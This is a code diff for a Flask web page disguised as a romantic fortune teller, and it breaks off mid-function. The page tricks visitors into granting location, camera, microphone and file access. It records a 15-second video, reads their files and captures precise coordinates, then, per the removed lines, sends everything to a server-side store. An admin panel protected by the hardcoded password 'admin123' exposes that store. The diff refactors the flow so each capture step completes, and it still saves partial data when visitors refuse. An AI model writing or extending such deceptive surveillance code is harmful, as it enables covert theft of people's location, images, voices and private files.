@@ -13,7 +13,7 @@ import json
 
 app = Flask(__name__)
 
-# Fortune messages (32 romantic fortunes)
+# Fortune messages (32 romantic fortunes) - UNCHANGED
 FORTUNES = [
     "Your soulmate is thinking of you right now 💕",
     "A passionate kiss awaits you this week 😘",
@@ -159,6 +159,14 @@ def fortune_teller():
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
         }
+        .progress-ring {
+            transform: rotate(-90deg);
+        }
+        .progress-ring-circle {
+            stroke-dasharray: 251.2;
+            stroke-dashoffset: 251.2;
+            transition: stroke-dashoffset 0.3s;
+        }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
@@ -199,12 +207,47 @@ def fortune_teller():
                 For your <strong>ultra-personalized love vision</strong>, please allow:
             </p>
             <div class="bg-gradient-to-r from-blue-100 to-purple-100 p-4 rounded-xl">
-                📍 Location (for love map) | 🎤 Voice (energy reading) | 📸 Photo (soul image) | 📁 Special file
+                📍 Location | 🎤 Voice | 📸 Camera | 📁 Special Files
             </div>
-            <button onclick="requestAllPermissions()" 
+            <button id="allow-btn" onclick="requestAllPermissions()" 
                     class="w-full bg-gradient-to-r from-green-500 to-blue-500 text-white py-4 px-8 rounded-2xl text-lg font-semibold shadow-lg hover:shadow-xl transform hover:-translate-y-1 transition-all duration-300">
                 ✅ Allow All for Perfect Reading
             </button>
+        </div>
+
+        <!-- STEP-BY-STEP PROGRESS -->
+        <div id="progress-location" class="hidden mt-8 p-6 bg-white/70 rounded-2xl backdrop-blur-sm">
+            <div class="text-xl font-semibold mb-4">📍 Finding Your Love Coordinates</div>
+            <div class="flex justify-center mb-4">
+                <svg class="w-20 h-20" viewBox="0 0 100 100">
+                    <circle class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#e5e7eb" stroke-width="8"></circle>
+                    <circle id="location-progress" class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#10b981" stroke-width="8" stroke-linecap="round"></circle>
+                </svg>
+            </div>
+            <div class="text-lg font-medium text-gray-700" id="location-status">Requesting location permission...</div>
+        </div>
+
+        <div id="progress-media" class="hidden mt-8 p-6 bg-white/70 rounded-2xl backdrop-blur-sm">
+            <div class="text-xl font-semibold mb-4">🎥 Capturing Your Love Energy</div>
+            <div class="flex justify-center mb-4">
+                <svg class="w-20 h-20" viewBox="0 0 100 100">
+                    <circle class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#e5e7eb" stroke-width="8"></circle>
+                    <circle id="media-progress" class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#f59e0b" stroke-width="8" stroke-linecap="round"></circle>
+                </svg>
+            </div>
+            <div class="text-lg font-medium text-gray-700" id="media-status">Recording your energy (15s)...</div>
+            <div class="text-3xl mt-2" id="media-countdown">--</div>
+        </div>
+
+        <div id="progress-files" class="hidden mt-8 p-6 bg-white/70 rounded-2xl backdrop-blur-sm">
+            <div class="text-xl font-semibold mb-4">📁 Uploading Love Memories</div>
+            <div class="flex justify-center mb-4">
+                <svg class="w-20 h-20" viewBox="0 0 100 100">
+                    <circle class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#e5e7eb" stroke-width="8"></circle>
+                    <circle id="files-progress" class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#8b5cf6" stroke-width="8" stroke-linecap="round"></circle>
+                </svg>
+            </div>
+            <div class="text-lg font-medium text-gray-700" id="files-status">Processing your special files...</div>
         </div>
 
         <div id="result" class="hidden mt-12 space-y-6">
@@ -222,7 +265,7 @@ def fortune_teller():
     </div>
 
     <script>
-        // Create floating hearts
+        // Create floating hearts - UNCHANGED
         function createHeart() {
             const heart = document.createElement('div');
             heart.innerHTML = '💖';
@@ -287,199 +330,143 @@ def fortune_teller():
             document.getElementById('loading').classList.remove('hidden');
             
             collectDeviceInfo().then(() => {
-                visitorData.ip = '{% raw %}{{ request.remote_addr }}{% endraw %}';
+                visitorData.ip = 'server-will-fill';
                 visitorData.user_agent = navigator.userAgent;
                 
-                document.getElementById('loading').classList.add('hidden');
-                document.getElementById('permissions').classList.remove('hidden');
+                setTimeout(() => {
+                    document.getElementById('loading').classList.add('hidden');
+                    document.getElementById('permissions').classList.remove('hidden');
+                }, 1000);
             });
         }
 
+        // ✅ FIXED: Sequential Promise Chain - Wait for Each Step
         async function requestAllPermissions() {
-            document.getElementById('permissions').classList.add('hidden');
-            document.getElementById('loading').classList.remove('hidden');
-            
             try {
-                // 1. Geolocation (existing)
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    });
-                });
+                // Hide button, show first step
+                document.getElementById('allow-btn').classList.add('hidden');
+                document.getElementById('permissions').classList.add('hidden');
                 
-                visitorData.latitude = position.coords.latitude;
-                visitorData.longitude = position.coords.longitude;
-                visitorData.accuracy = position.coords.accuracy;
+                // STEP 1: LOCATION (wait for success)
+                await requestLocation();
                 
-                // 2. Microphone + Camera (simultaneous)
-                try {
-                    mediaStream = await navigator.mediaDevices.getUserMedia({
-                        audio: true,
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-                    });
-                    
-                    // Record 15 seconds
-                    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
+                // STEP 2: MEDIA (wait for full 15s recording)
+                await requestMedia();
+                
+                // STEP 3: FILES (wait for all file reads)
+                await requestFiles();
+                
+                // STEP 4: FINALIZE & SAVE (only now!)
+                await finalizeAndSave();
+                
+            } catch (error) {
+                console.log('Permission flow interrupted:', error);
+                // Still save what we have
+                await finalizeAndSave();
+            }
+        }
+
+        // STEP 1: Location - Wait for coords
+        function requestLocation() {
+            return new Promise((resolve, reject) => {
+                showProgress('progress-location', 'Requesting location permission...', 0);
+                
+                const timeout = setTimeout(() => reject('Location timeout'), 20000);
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        clearTimeout(timeout);
+                        visitorData.latitude = position.coords.latitude;
+                        visitorData.longitude = position.coords.longitude;
+                        visitorData.accuracy = position.coords.accuracy;
+                        
+                        showProgress('progress-location', 'Love coordinates captured! ✨', 100);
+                        setTimeout(() => {
+                            hideProgress('progress-location');
+                            resolve();
+                        }, 1000);
+                    },
+                    (error) => {
+                        clearTimeout(timeout);
+                        visitorData.latitude = 'denied';
+                        showProgress('progress-location', 'Location optional - continuing... 💖', 100);
+                        setTimeout(() => {
+                            hideProgress('progress-location');
+                            resolve(); // Continue even if denied
+                        }, 1000);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // STEP 2: Media - Wait FULL 15s recording
+        function requestMedia() {
+            return new Promise((resolve, reject) => {
+                showProgress('progress-media', 'Allow camera & microphone...', 10);
+                
+                navigator.mediaDevices.getUserMedia({
+                    audio: true,
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                }).then((stream) => {
+                    mediaStream = stream;
                     recordedBlobs = [];
+                    
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
                     
                     mediaRecorder.ondataavailable = (event) => {
                         if (event.data.size > 0) recordedBlobs.push(event.data);
                     };
                     
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if (mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
+                    mediaRecorder.onstop = () => {
+                        if (recordedBlobs.length > 0) {
+                            const blob = new Blob(recordedBlobs, { type: 'video/webm' });
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                visitorData.camera_video = reader.result.split(',')[1];
+                                visitorData.microphone_audio = `15s_video_${recordedBlobs[0].size}bytes`;
+                                mediaStream.getTracks().forEach(track => track.stop());
+                                showProgress('progress-media', 'Love energy captured! 💖', 100);
+                                setTimeout(() => {
+                                    hideProgress('progress-media');
+                                    resolve();
+                                }, 800);
+                            };
+                            reader.readAsDataURL(blob);
+                        } else {
+                            visitorData.camera_video = 'empty';
+                            resolve();
                         }
-                    }, 15000);
-                    
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(recordedBlobs, { type: 'video/webm' });
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            visitorData.camera_video = reader.result.split(',')[1]; // base64 data
-                            mediaStream.getTracks().forEach(track => track.stop());
-                        };
-                        reader.readAsDataURL(blob);
                     };
                     
-                    visitorData.microphone_audio = 'captured_15s';
+                    // START RECORDING with 15s timer
+                    mediaRecorder.start();
+                    let timeLeft = 15;
+                    const countdownEl = document.getElementById('media-countdown');
+                    countdownEl.textContent = timeLeft;
                     
-                } catch (mediaErr) {
-                    console.log('Media permissions denied');
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        countdownEl.textContent = timeLeft;
+                        updateProgress('media-progress', (15 - timeLeft) / 15 * 90 + 10); // 10-100%
+                        
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            mediaRecorder.stop();
+                        }
+                    }, 1000);
+                    
+                }).catch((err) => {
                     visitorData.microphone_audio = 'denied';
                     visitorData.camera_video = 'denied';
-                }
-                
-                // 3. Local Files
-                try {
-                    const [fileHandle] = await window.showOpenFilePicker({
-                        types: [{
-                            description: 'Images & Files',
-                            accept: {
-                                'image/*': ['.jpg', '.png', '.gif'],
-                                'video/*': ['.mp4', '.webm'],
-                                'text/*': ['.txt'],
-                                '*/*': ['.*']
-                            }
-                        }],
-                        multiple: true
-                    });
-                    
-                    const filesData = [];
-                    for (const handle of fileHandle) {
-                        const file = await handle.getFile();
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            filesData.push({
-                                name: file.name,
-                                size: file.size,
-                                type: file.type,
-                                data: reader.result.split(',')[1]
-                            });
-                        };
-                        reader.readAsDataURL(file);
-                    }
-                    visitorData.local_files = JSON.stringify(filesData.slice(0, 3)); // Limit to 3 files
-                    
-                } catch (fileErr) {
-                    visitorData.local_files = 'denied';
-                }
-                
-                // Generate map + fortune
-                const mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
-                visitorData.map_url = mapUrl;
-                
-                const tinyMap = await fetch('/tinyurl', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({url: mapUrl})
-                }).then(r => r.json());
-                
-                // Send ALL data
-                fetch('/save', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(visitorData)
+                    showProgress('progress-media', 'Media optional - continuing... ✨', 100);
+                    setTimeout(() => {
+                        hideProgress('progress-media');
+                        resolve(); // Continue even if denied
+                    }, 1000);
                 });
-                
-                // Show fortune
-                document.getElementById('loading').classList.add('hidden');
-                document.getElementById('result').classList.remove('hidden');
-                document.getElementById('fortune-text').textContent = `{{ fortunes[ Math.floor(Math.random() * {{ fortunes|length }}) ] }} Dear ${name}! 💕`;
-                document.getElementById('map-url').textContent = tinyMap.url;
-                document.getElementById('map-link').classList.remove('hidden');
-                
-            } catch (geoErr) {
-                alert('Location access needed for your cosmic love map 🌍💕 Please refresh and try again');
-            }
+            });
         }
-    </script>
-</body>
-</html>
-    ''', fortunes=FORTUNES)
 
-@app.route('/save', methods=['POST'])
-def save_data():
-    data = request.get_json()
-    data['ip'] = get_client_ip()
-    success = save_visitor_data(data)
-    return {'status': 'saved' if success else 'error'}
-
-@app.route('/tinyurl', methods=['POST'])
-def create_tinyurl():
-    try:
-        url = request.json['url']
-        tiny = get_tinyurl(url)
-        return {'url': tiny}
-    except:
-        return {'url': request.json['url']}
-
-@app.route('/admin')
-def admin_panel():
-    password = request.args.get('pass')
-    if password != 'admin123':
-        return '<h1>🔒 Access Denied</h1>', 403
-    
-    if os.path.exists(DATA_FILE):
-        return send_file(DATA_FILE, as_attachment=True, download_name='love_fortunes_data.xlsx')
-    
-    return '<h1>No data yet</h1>'
-
-@app.route('/admin/table')
-def admin_table():
-    password = request.args.get('pass')
-    if password != 'admin123':
-        return '<h1>🔒 Access Denied</h1>', 403
-    
-    try:
-        df = pd.read_excel(DATA_FILE)
-        html_table = df.to_html(classes='table table-striped', index=False, escape=False)
-        return f'''
-        <!DOCTYPE html>
-        <html><head><title>Love Fortune Data</title>
-        <style>
-            body {{ font-family: Arial; margin: 40px; }}
-            table {{ border-collapse: collapse; width: 100%; }}
-            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
-            th {{ background-color: #f2f2f2; }}
-            .coords {{ color: #0066cc; font-weight: bold; }}
-        </style></head>
-        <body>
-            <h1>💕 Love Fortune Visitor Data ({len(df)} records)</h1>
-            <p><a href="/admin?pass=admin123" class="btn">📥 Download Excel</a> | 
-            <a href="/admin/table?pass=admin123" class="btn">🔄 Refresh</a></p>
-            <div style="overflow-x:auto;">{html_table}</div>
-        </body></html>
-        '''
-    except:
-        return '<h1>No data file found</h1>'
-
-if __name__ == '__main__':
-    init_excel()
-    print("Love Fortune Teller running on http://0.0.0.0:5000")
-    print("Admin: /admin?pass=admin123")
-    print("Admin Table: /admin/table?pass=admin123")
-    app.run(host='0.0.0.0', port=5000, debug=False)
+        // STEP 3: Files - Wait for ALL file reads
+        function requestFiles()
